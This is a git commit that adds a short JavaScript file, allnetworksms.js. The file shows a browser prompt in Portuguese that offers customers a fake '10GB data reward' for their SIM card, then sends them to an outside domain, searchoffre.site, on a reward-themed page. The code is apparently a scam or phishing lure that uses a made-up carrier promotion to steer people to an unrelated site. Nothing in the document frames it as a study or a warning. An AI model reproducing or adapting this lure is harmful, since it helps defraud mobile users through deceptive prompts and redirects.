636ae4e49fd4cfbed41482673f620060824a7635
bigetijazz8 <bigetijazz8@gmail.com>
2024-07-18 23:46:42 -0700

    Create allnetworksms.js

---
+++ allnetworksms.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Recompensa de dados: Prezado cliente, verifique se o seu cartão SIM está qualificado para receber dados de 10GB. Recompensa para todas as redes, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://www.searchoffre.site/Ganhe-10GB-de-recompensa';
+}
